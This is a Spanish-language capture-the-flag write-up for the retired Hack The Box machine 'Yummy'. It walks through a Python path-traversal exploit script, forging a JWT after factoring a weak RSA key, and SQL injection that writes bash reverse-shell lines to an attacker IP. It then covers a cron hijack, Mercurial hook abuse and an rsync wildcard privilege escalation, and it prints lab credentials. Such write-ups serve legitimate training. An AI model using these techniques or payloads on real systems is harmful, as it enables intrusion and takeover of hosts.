---
title: "htb // yummy"
date: 2026-05-15
description: "writeup ténico sobre la máquina ya retirada llamada Yummy"
tags: ["enum", "linux", "htb", "writeup"]
draft: false
---

# HTB: Yummy

**Dificultad:** Hard · **SO:** Linux · **Creador:** LazyTitan33

## Resumen del recorrido

Yummy es una máquina Linux que arranca con un sitio web de reservas para un restaurante. El camino completo es el siguiente:

- Se abusa de una vulnerabilidad de **directory traversal** en la función que genera los archivos de invitación de calendario (`.ics`) para leer ficheros arbitrarios del host. Con esto se obtiene el código fuente de la aplicación y los crons que se ejecutan.
- Se factoriza la clave **RSA** débil usada para firmar la cookie **JWT**, lo que permite forjar un token con rol de administrador.
- Desde el panel de administración se explota una **inyección SQL** que, gracias a privilegios `FILE` en MySQL, permite escribir un script que un cron ejecuta → shell como `mysql`.
- Se abusa de otro cron (con permisos laxos sobre el directorio de scripts) para saltar a `www-data`.
- `www-data` tiene acceso a un repositorio **Mercurial** (similar a Git) donde, revisando commits antiguos, aparecen las credenciales de otro usuario → `qa`.
- `qa` puede ejecutar `hg pull` como `dev` vía `sudo`; se abusa de los **hooks de Mercurial** para pivotar a `dev`.
- `dev` puede ejecutar `rsync` como root vía `sudo`; se abusa del comodín y del flag `--chown` para crear un binario SetUID propiedad de root → shell como `root`.

Al final, en "Beyond Root", se analiza por qué el código Python se comporta como lo hace y qué malas configuraciones (en MySQL y AppArmor) habilitan la escritura de archivos desde el usuario `mysql`.

---

## Reconocimiento

### nmap

Un primer escaneo de todos los puertos TCP revela solo dos abiertos: SSH (22) y HTTP (80).

```bash
nmap -p- --min-rate 10000 <IP_OBJETIVO>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A continuación, un escaneo con detección de versiones y scripts por defecto sobre esos dos puertos:

```bash
nmap -p 22,80 -sCV <IP_OBJETIVO>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://yummy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La versión de OpenSSH sugiere **Ubuntu 24.04 (noble)** y el servidor web es **Caddy**. El puerto 80 redirige a `yummy.htb`, así que se añade el dominio al fichero de hosts:

```bash
echo "<IP_OBJETIVO> yummy.htb" | sudo tee -a /etc/hosts
```

Fuzzeando subdominios con `ffuf` no se encuentra ninguno que responda de forma distinta, así que seguimos con el dominio principal.

### Sitio web (TCP 80)

El sitio es una página de reservas de restaurante. La mayoría de los enlaces apuntan a anclas dentro de la misma página, pero hay tres que llevan a otros sitios: **Login**, **Register** y **Dashboard** (este último redirige a `/login`). En el centro hay un formulario "Book a Table" que envía los datos a `/book`, y los formularios "Contact Us" y "Subscribe" hacen POST a `/`.

#### Zona autenticada

Tras registrarse en `/register` e iniciar sesión, se carga `/dashboard`, que muestra una tabla vacía. Al reservar una mesa con el mismo correo, la reserva aparece en la tabla. Cada reserva tiene un botón **"Save ICalendar"** que descarga un archivo `.ics`:

```bash
file Yummy_reservation_20241007_222821.ics
```

```
Yummy_reservation_20241007_222821.ics: iCalendar calendar file
```

Los metadatos del fichero indican que se genera con la librería **`ics.py`**:

```bash
exiftool Yummy_reservation_20241007_222821.ics
```

```
...
MIME Type        : text/calendar
VCalendar Version: 2.0
Software         : ics.py - http://git.io/lLljaA
Description      : Email: attacker@yummy.htb.Number of People: 223.Message: test
Summary          : pwn
```

#### Stack tecnológico

Las cabeceras de respuesta apenas revelan información más allá de `Server: Caddy`. El sitio establece dos cookies:

- La primera llega al hacer POST a `/book` (antes de loguearse) y parece usarse para mensajes flash (`session=...`, una cookie típica de Flask).
- La segunda se establece al iniciar sesión: `X-AUTH-Token`, que es un **JWT** firmado con criptografía de clave pública.

Decodificando el payload del JWT:

```json
{
    "email": "attacker@yummy.htb",
    "role": "customer_ef914c3d",
    "iat": 1728340003,
    "exp": 1728343603,
    "jwk": {
        "kty": "RSA",
        "n": "11168920289039868478976675850813510143045505745888366880037209248760712595834335926230985842430977964704794187524130066292940305117038218758753203380541961922926641613203110670999286077691952215933014348714157933795607968037073816940589530627403924516755793641402842094096064840827308071214625018354248559426512366  1",
        "e": 65537
    }
}
```

Llama la atención que el propio token incluya el módulo `n` dentro de `jwk`. Un análisis del valor `n` muestra que es **débil y factorizable** (lo vemos más adelante). La página de error 404 coincide con la de Flask por defecto, así que el stack es probablemente un servidor **Python/Flask** detrás de **Caddy**.

#### Fuzzing de directorios

```bash
feroxbuster -u http://yummy.htb --dont-extract-links
```

```
200  GET  http://yummy.htb/register
200  GET  http://yummy.htb/login
302  GET  http://yummy.htb/logout => http://yummy.htb/login
200  GET  http://yummy.htb/
200  GET  http://yummy.htb/book
302  GET  http://yummy.htb/dashboard => http://yummy.htb/login
```

Se usa `--dont-extract-links` para reducir el ruido. No aparece nada nuevo respecto a lo ya conocido.

---

## Shell como mysql

### Lectura de archivos

#### Patrón de peticiones

Al descargar el archivo `.ics` se generan en realidad **dos peticiones HTTP**:

1. La primera va a `/reminder/<id>` y devuelve un **302** que redirige a la segunda.
2. La segunda va a `/export/<algo-que-parece-un-nombre-de-fichero>` y devuelve el archivo.

Cómo comprobarlo: descargar el mismo recordatorio dos veces. La primera URL (`/reminder/...`) es siempre la misma, pero la segunda (`/export/...`) cambia en cada descarga. Esto implica que el archivo se **genera** en la primera petición y luego la redirección apunta a la URL donde se **descarga**.

#### Reenviar /export

La reacción inicial es reenviar la petición a `/export` cambiando el nombre del archivo. Cómo hacerlo: enviar esa petición a Burp Repeater y editar el nombre. El problema es que cualquier cosa que se envíe devuelve **500 Internal Server Error**, incluso reenviar la petición legítima del `.ics` recién descargado falla. Parece que la petición a `/reminder` **habilita** la siguiente a `/export` una sola vez (en "Beyond Root" se explica por qué).

#### Directory Traversal

Cómo probarlo: activar la intercepción en el proxy de Burp y descargar el archivo.

1. La primera petición que llega es `GET /reminder/21`. Se reenvía **sin modificar**.
2. Inmediatamente después aparece la petición del archivo `.ics`. En esa segunda petición se cambia la ruta por un payload de traversal, por ejemplo `/export/../../../../../../etc/passwd`.
3. Al reenviarla, en el historial HTTP se ve la petición modificada con la respuesta: se logra leer `/etc/passwd`.

Si se intenta enviar la misma petición otra vez, vuelve a devolver 500 (el comportamiento de "un solo uso" comentado antes).

#### Script de lectura

Como leer un solo fichero requiere bastante trabajo manual, conviene automatizarlo con un pequeño script en Python que ofrece una shell interactiva: se loguea, crea una reserva, obtiene el `booking_id` y permite pedir cualquier ruta. Si la petición a `/reminder` deja de habilitar `/export`, vuelve a registrarse y reserva de nuevo.

```python
import re
import requests
from cmd import Cmd

base_url = 'http://yummy.htb'

class Term(Cmd):

    prompt = "yummy> "

    def __init__(self):
        super().__init__()
        self.sess = requests.session()
        self.login()
        self.booking_id = self.get_booking_id()

    def login(self):
        login_data = {"email":"attacker@yummy.htb","password":"Passw0rd123!"}
        resp = self.sess.post(f'{base_url}/register', json=login_data)
        resp = self.sess.post(f'{base_url}/login', json=login_data)
        resp.raise_for_status()

    def get_booking_id(self):
        book_data = {
            "name": "pwn",
            "email": "attacker@yummy.htb",
            "phone": "1111111111",
            "date": "2025-02-18",
            "time": "12:52",
            "people": "100",
            "message": ""
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        resp = self.sess.post(f'{base_url}/book', data=book_data, headers=headers)
        resp.raise_for_status()

        resp = self.sess.get(f'{base_url}/dashboard')
        resp.raise_for_status()
        return re.findall(r'\/reminder\/(\d+)', resp.text)[0]

    def do_exit(self, args):
        return 1  # termina

    def do_EOF(self, args):
        print()
        return 1  # termina

    def get_file(self, fn):
        resp = self.sess.get(f'{base_url}/reminder/{self.booking_id}', allow_redirects=False)
        if not resp.headers["location"].startswith("/export/"):
            self.login()
            self.booking_id = self.get_booking_id()
            self.get_file(fn)
            return 0

        url = f'{base_url}/export/../../../../../../{fn}'
        headers = {"Cookie": '; '.join([f'{k}={v}' for k, v in self.sess.cookies.get_dict().items()])}
        req = requests.Request(method="GET", url=url, headers=headers)
        prep_req = req.prepare()
        prep_req.url = url
        resp = self.sess.send(prep_req, verify=False, allow_redirects=False)
        if resp.status_code == 200:
            return resp.content
        elif resp.status_code == 500:
            print(f'Access Denied: {fn}')
        elif resp.status_code == 404:
            print(f'File Not Found: {fn}')
        else:
            print(f'Unexpected response code for {fn}: {resp}')
        return None

    def default(self, args):
        if contents := self.get_file(args):
            print(contents.decode())

    def do_save(self, args):
        '''save <ruta del fichero> <fichero de salida>'''
        fn, outfile = args.split(' ')
        if contents := self.get_file(fn):
            with open(outfile, 'wb') as f:
                f.write(contents)

term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
```

Al ejecutarlo, se obtiene un prompt donde se introduce una ruta y se imprime el contenido:

```
yummy> /etc/hostname
yummy
yummy> /etc/hosts
127.0.0.1 localhost yummy yummy.htb
127.0.1.1 yummy
...
yummy>
```

### Crons

#### crontab

Leyendo `/etc/crontab` con el script anterior:

```
yummy> /etc/crontab
```

```
SHELL=/bin/sh
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

Además de los crons estándar, hay **tres scripts** propios en `/data/scripts`, ejecutados por `www-data` y `mysql`.

#### scripts

`app_backup.sh` crea un backup del directorio web (lo ejecuta `www-data` cada minuto):

```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

`table_cleanup.sh` es lo que limpia la cuenta cada 15 minutos (revela las credenciales de la BD del usuario `chef`):

```bash
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
```

`dbmonitor.sh` es el más interesante:

```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

La lógica clave: el script comprueba si la base de datos está activa. Si **no** lo está (o si existe `dbstatus.json` con contenido que no sea "database is down"), ejecuta como `mysql` el script `fixer-v*` más reciente del directorio. **Conclusión:** si se puede escribir un fichero `fixer-v...` en ese directorio, se ejecutará como `mysql`.

### Código fuente del sitio

#### app.py

Como la lectura de ficheros pasa por la aplicación Flask, el directorio de trabajo es `/proc/self/cwd`. Se puede deducir que la app arranca en `app.py` y leerlo en `/proc/self/cwd/app.py`. Alternativamente, se puede descargar `/var/www/backupapp.zip` (generado por el cron de backup) y sacar todo el código de ahí.

Partes relevantes de `app.py`:

```python
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS
}
```

```python
@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))

        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # opción añadida para ordenar las reservas
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)
```

Dos cosas importantes:

1. Aparece una ruta nueva, `/admindashboard`, que solo es accesible con el rol `administrator`.
2. El parámetro `o` (de orden) se concatena **directamente** en la consulta mediante un f-string → muy probablemente vulnerable a **inyección SQL**. El parámetro `s` sí va parametrizado, pero `o` no.

La función que valida el acceso:

```python
def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None
```

Esto se apoya en `verify_token`, importado desde `middleware/verification.py`.

#### verification.py

```python
#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500
```

Toma la cookie y valida el JWT con `signature.public_key`. El objeto `signature` viene de `config/signature.py`.

#### signature.py

Aquí está la generación de la clave RSA:

```python
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy

# Genera el par de claves RSA
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

El fallo: el primo `q` se elige entre `2^19` y `2^20` (un valor **diminuto**), mientras que `p` se deriva de `n = q * p`. Con un `q` tan pequeño, factorizar `n` es trivial.

### Acceso al panel de administración

#### Generar el par de claves

El JWT ya nos da el valor `n` (visible al decodificar sin verificar firma):

```python
>>> import jwt
>>> cookie = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...."
>>> jwt.decode(cookie, options={"verify_signature": False})
{'email': 'attacker@yummy.htb', 'role': 'customer_b8f14102', 'iat': 1728573065, 'exp': 1728576665, 'jwk': {'kty': 'RSA', 'n': '127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491', 'e': 65537}}
```

> Nota: el valor `n` cambia cada vez que se reinicia el servidor Flask, así que será distinto en cada reseteo de la máquina.

Cómo factorizarlo: **SageMath** tiene una función `factor` muy cómoda. Instalarlo en local es engorroso, pero hay un evaluador online de Sage que sirve perfecto para una comprobación rápida — `factor(n)` resuelve en un par de segundos y devuelve `p` y `q`.

Con `p` y `q` se reconstruye la clave privada, reutilizando código casi idéntico al de la fuente, en un REPL de Python:

```python
>>> from Crypto.PublicKey import RSA
>>> q = 1011961
>>> n = 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
>>> p = n // q
>>> e = 65537
>>> phi_n = (p - 1) * (q - 1)
>>> d = pow(e, -1, phi_n)
>>> key = RSA.construct((n, e, d, p, q))
```

Y se exportan las claves a ficheros:

```python
>>> with open('yummy_rsa', 'wb') as f: f.write(key.export_key("PEM"))
>>> with open('yummy_rsa.pub', 'wb') as f: f.write(key.publickey().export_key("PEM"))
```

Alternativa: dejar que **RsaCtfTool** haga todo el trabajo a partir de `n`:

```bash
python RsaCtfTool.py --private -n 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
```

```bash
python RsaCtfTool.py --createpub -n 127754485625398130062308776435339803257061921095620451929717797698476734550353259661978394340356935360556342962726946429163946108309982952463487606123949478069143558790561504300842270504504756141565253892778309208651002018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491
```

#### Forjar el JWT

Con las claves, se forja un JWT con `role = administrator` y nuestro correo, usando **jwt_tool**. Sin argumentos, muestra los valores actuales del token:

```bash
python /opt/jwt_tool/jwt_tool.py <token>
```

Los argumentos para modificar la cookie son:

- `-pk` y `-pr` → indican las claves pública y privada.
- `-S` → algoritmo de firma.
- `-I` → inyectar claims.
- `-pc <claim>` → claim a modificar.
- `-pv <valor>` → valor para ese claim.

```bash
python /opt/jwt_tool/jwt_tool.py -pk yummy_rsa.pub -pr yummy_rsa -S rs256 \
  -I -pc role -pv administrator -pc exp -pv 2728560132 <token>
```

Cómo usarlo: copiar el token resultante en las DevTools de Firefox como valor de la cookie `X-AUTH-Token`. Al recargar, `/admindashboard` carga correctamente.

### Ejecución

#### POC de la inyección SQL

El punto vulnerable:

```python
order_query = request.args.get('o', '')

sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
cursor.execute(sql, ('%' + search_query + '%',))
```

El parámetro `o` se concatena sin sanear. Se puede ver en acción: al pulsar las flechitas de ordenación en la página, la URL cambia a `http://yummy.htb/admindashboard?s=&o=DESC`. Añadiendo una comilla simple al final, la aplicación devuelve un error → confirmada la inyección.

#### sqlmap

Cómo hacerlo: guardar la petición a `/admindashboard` con los parámetros `s` y `o` en un fichero (para conservar el JWT) y pasársela a sqlmap apuntando al parámetro `o`:

```bash
sqlmap -r admindash.request -p o --batch
```

```
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)
    Payload: s=&o=DESC,EXTRACTVALUE(7214,CONCAT(0x5c,0x7162717071,(SELECT (ELT(7214=7214,1))),0x71787a7171))

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: s=&o=DESC;SELECT SLEEP(5)#
```

Es interesante que sea vulnerable a **stacked queries**: por defecto MySQL no las permite, pero aquí están habilitadas (se explica en "Beyond Root").

#### Comprobación de privilegios

Como ya sabemos que escribir ficheros nos da RCE (vía el cron `dbmonitor.sh`), comprobamos si el usuario de BD tiene privilegio `FILE`:

```bash
sqlmap -r admindash.request -p o --privileges
```

```
database management system users privileges:
[*] 'chef'@'localhost' [1]:
    privilege: FILE
```

El usuario de BD tiene privilegios **FILE** (otra configuración no estándar, detallada al final).

#### POC de escritura de ficheros

Prueba con sqlmap escribiendo un fichero de prueba:

```bash
echo "this is a test" > test
sqlmap -r admindash.request -p o --file-write test --file-dest /tmp/pwn
```

Al intentar leerlo como usuario web, falla con "Access denied" — pero falla de forma **distinta** a un fichero inexistente, lo que confirma que la escritura funcionó:

```
yummy> /tmp/pwn
Access denied
yummy> /tmp/pwn2
/tmp/pwn2 not found
```

Como sqlmap puede ser excesivo y las stacked queries lo facilitan, también se puede hacer manualmente. Partiendo de que `/tmp/aaaa` no existe, se visita:

```
http://yummy.htb/admindashboard?s=&o=DESC; select "test" INTO OUTFILE '/tmp/aaaa';
```

Y a partir de ahí el fichero ya existe.

#### RCE

Para conseguir ejecución hay que escribir **dos ficheros** que disparen la rama vulnerable de `dbmonitor.sh`:

1. Cualquier cosa que **no** sea "database is down" en `dbstatus.json`.
2. El script a ejecutar como `fixer-v<lo-que-sea>`.

Se visitan estas dos URLs (nótese el `%26` para escapar el `&` de la reverse shell):

```
http://yummy.htb/admindashboard?s=&o=DESC; select "test" INTO OUTFILE '/data/scripts/dbstatus.json';
http://yummy.htb/admindashboard?s=&o=DESC; select "bash -i >%26 /dev/tcp/<IP_VPN>/443 0>%261" INTO OUTFILE '/data/scripts/fixer-v223.sh';
```

En menos de un minuto, llega la shell al listener:

```bash
nc -lnvp 443
```

```
Connection received on <IP_OBJETIVO> 49286
mysql@yummy:/var/spool/cron$
```

Se estabiliza la shell:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# reset; screen
```

---

## Shell como www-data

### Enumeración

#### Usuarios

Hay dos usuarios no-root con directorio home y shell:

```bash
cat /etc/passwd | grep "sh$"
```

```
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev:/home/dev:/bin/bash
qa:x:1001:1001::/home/qa:/bin/bash
```

El usuario `mysql` no puede acceder a ninguno de esos directorios ni tiene home propio.

#### scripts

Los scripts de `/data/scripts` son los esperados, pero **los permisos del directorio son muy laxos** (`drwxrwxrwx`): cualquier usuario puede borrar y crear ficheros ahí.

```bash
ls -la /data/scripts
```

```
drwxrwxrwx 2 root root 4096 ... .
-rw-r--r-- 1 root root   90 ... app_backup.sh
-rw-r--r-- 1 root root 1336 ... dbmonitor.sh
-rw-r----- 1 root root   60 ... fixer-v1.0.1.sh
-rw-r--r-- 1 root root 5570 ... sqlappointments.sql
-rw-r--r-- 1 root root  114 ... table_cleanup.sh
```

### Sustituir el script del cron

`www-data` ejecuta `app_backup.sh` cada minuto. No se puede editar el fichero, pero sí **moverlo y crear uno nuevo** en su lugar:

```bash
mv app_backup.sh app_backup.sh.bak
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP_VPN>/443 0>&1' | tee app_backup.sh
```

Cuando pasa el minuto, llega la shell como `www-data`:

```bash
nc -lnvp 443
```

```
Connection received on <IP_OBJETIVO> 45862
www-data@yummy:/root$
```

Curiosamente la shell arranca desde `/root`, aunque `www-data` sigue sin poder acceder a nada ahí. Se estabiliza igual que antes.

---

## Shell como qa

### Enumeración

#### Directorios de la aplicación

En `/var/www` hay un directorio `app-qatesting` además del `backupapp.zip`:

```bash
ls
# app-qatesting  backupapp.zip
```

`app-qatesting` se parece mucho a `/opt/app`, pero al mirar los ficheros ocultos hay una diferencia clave: un directorio `.hg`, es decir, un **repositorio Mercurial** (similar a Git).

```bash
ls -la ~/app-qatesting
```

```
-rw-rw-r-- 1 qa qa app.py
drwxr-xr-x 3 qa qa config
drwxrwxr-x 6 qa qa .hg
drwxr-xr-x 3 qa qa middleware
...
```

#### Repositorio

Cómo revisarlo: mostrar el historial de commits.

```bash
hg log --template '{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n'
```

```
f3787cac6111 | 2024-05-28 ... | qa:  attempt at patching path traversal
0bbf8464d2d2 | 2024-05-28 ... | qa:  removed comments
2ec0ee295b83 | 2024-05-28 ... | qa:  patched SQL injection vuln
f87bdc6c94a8 | 2024-05-28 ... | qa:  patched signature vuln
6c59496d5251 | 2024-05-28 ... | dev: updated db creds
f228abd7a139 | 2024-05-28 ... | dev: randomized secret key
9046153e7a23 | 2024-05-28 ... | dev: added admin order option
f2533b9083da | 2024-05-28 ... | dev: added admin capabilities
be935002334f | 2024-05-28 ... | dev: added admin template
f54c91c7fae8 | 2024-05-28 ... | dev: initial commit
```

Con `hg diff -c <número>` se inspeccionan los cambios. En el cambio nº 9 se actualizan las credenciales de la BD, lo que revela las credenciales **anteriores** (las del usuario `qa`):

```bash
hg diff -c 9
```

```diff
 db_config = {
     'host': '127.0.0.1',
-    'user': 'qa',
-    'password': 'jPAd!XQCtn8Oc@2B',
+    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
     'database': 'yummy_db',
     ...
 }
```

### su / SSH

Las credenciales funcionan tanto con `su` como por SSH:

```bash
su - qa
# Password: jPAd!XQCtn8Oc@2B
```

```bash
sshpass -p 'jPAd!XQCtn8Oc@2B' ssh qa@yummy.htb
```

Y se obtiene la flag de usuario:

```bash
cat user.txt
# 95e522c7************************
```

---

## Shell como dev

### Enumeración

#### Directorio home

El home de `qa` es bastante típico. Lo interesante es `.hgrc` (configuración de Mercurial), que incluye una sección `[trusted]` confiando en los usuarios y grupos `qa` y `dev`:

```ini
[ui]
username = qa
...
[trusted]
users = qa, dev
groups = qa, dev
```

#### sudo

```bash
sudo -l
```

```
User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```

`qa` puede ejecutar como `dev` un `hg pull` desde `/home/dev/app-production`. Ese comando hace pull de ese repo hacia el repo actual; `qa` no tiene acceso directo a `app-production`.

### Abuso de hooks

El repositorio que **recibe** el pull puede tener configurados **hooks** que se ejecutan al producirse la operación, y lo hacen como el usuario que corre el pull (en este caso, `dev`).

Cómo hacerlo:

1. Crear un repositorio en una ubicación escribible, por ejemplo `/dev/shm`:

```bash
cd /dev/shm
hg init
```

2. `dev` necesitará permiso de escritura sobre los metadatos del repo, así que se abren:

```bash
chmod -R 777 .hg
```

3. Definir el hook en el `hgrc` interno del repo. Los comandos disponibles (incluyendo `pre-<command>` y `post-<command>`) están documentados en la sección "hooks" de Mercurial:

```bash
echo -e '[hooks]\npre-pull = /tmp/pwn' | tee .hg/hgrc
```

4. Crear `/tmp/pwn` como una reverse shell de bash y darle permisos de ejecución (`chmod +x /tmp/pwn`).

5. Lanzar el pull permitido por sudo:

```bash
sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```

El comando se queda colgado, pero en el listener llega la shell como `dev`:

```bash
nc -lnvp 443
```

```
Connection received on <IP_OBJETIVO> 49980
I'm out of office until October 11th, don't call me
dev@yummy:/dev/shm$
```

Se estabiliza la shell como en los pasos anteriores.

---

## Shell como root

### Enumeración

#### Directorio home

El home de `dev` no tiene gran cosa: `.ssh` está vacío, `.hgrc` es igual al de `qa`, y `app-production` es prácticamente idéntico a `/opt/app`.

#### sudo

```bash
sudo -l
```

```
User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* /opt/app/
```

`dev` puede ejecutar como root un `rsync` que sincroniza `app-production` hacia `/opt/app`.

### Explotación

El problema está en el comodín `*`, que permite **inyectar argumentos adicionales** a rsync. Se aprovecha el flag `--chown` para que los ficheros copiados queden como propiedad de root. Detalle importante: mientras que el comando `chown` elimina los bits SetUID/SetGID, el flag `--chown` de rsync **no** lo hace, por lo que se preserva el SetUID.

`app-production` parece recrearse en bucle (probablemente una rutina de limpieza de HTB), así que conviene trabajar desde fuera del directorio.

Pasos:

1. Crear en `app-production` una copia SetUID de `bash`:

```bash
cp /bin/bash app-production/pwn
chmod 6777 app-production/pwn
```

2. Sincronizar añadiendo `--chown root:root` mediante el comodín:

```bash
sudo rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/
ls -l /opt/app/pwn
# -rwsrwsrwx 1 root root ... /opt/app/pwn
```

3. Ejecutar el binario con `-p` para conservar privilegios:

```bash
/opt/app/pwn -p
# pwn-5.2#
```

Y se obtiene la flag de root:

```bash
cat root.txt
# 088531b8************************
```

---

## Beyond Root

### Código Python vulnerable

El endpoint `/book` recibe los datos del cliente, genera el archivo de invitación de calendario y registra la reserva en la BD:

```python
@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            filename = generate_ics_file(name, date, time, email, num_people, message)
            flash('Your booking request was sent. ...', 'success')
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (...) VALUES (%s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (email, date, time, num_people, message, 'customer'))
                    connection.commit()
            except Exception as e:
                print(e)

            return redirect(url_for('export_file', filename=filename))
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')
```

La parte interesante es `generate_ics_file`:

```python
def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    ...
    safe_filename = quote(f'Yummy_reservation_{formatted_date_time}.ics')
    temp_file_path = os.path.join(temp_dir, safe_filename)

    if not temp_file_path.startswith(temp_dir):
        raise ValueError("Invalid file path")
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)
```

